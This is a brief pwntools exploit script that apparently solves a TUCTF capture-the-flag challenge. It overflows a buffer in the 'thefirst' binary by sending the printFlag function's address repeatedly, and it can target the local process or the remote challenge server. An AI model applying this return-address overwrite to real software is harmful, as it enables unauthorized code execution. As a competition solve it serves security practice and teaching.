#!/usr/bin/env python2
from pwn import *
from mypwntools import * # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

#context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']

BINARY = "./thefirst"
HOST, PORT = 'chal.tuctf.com', 30508
LIBC_PATH = '/usr/lib/libc.so.6'

GDB_SETUP = """
set follow-fork-mode child
c
"""

if '--live' not in sys.argv:
    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)
binary = ELF(BINARY)

p.sendline(p32(binary.symbols['printFlag']) * 20)
p.interactive()

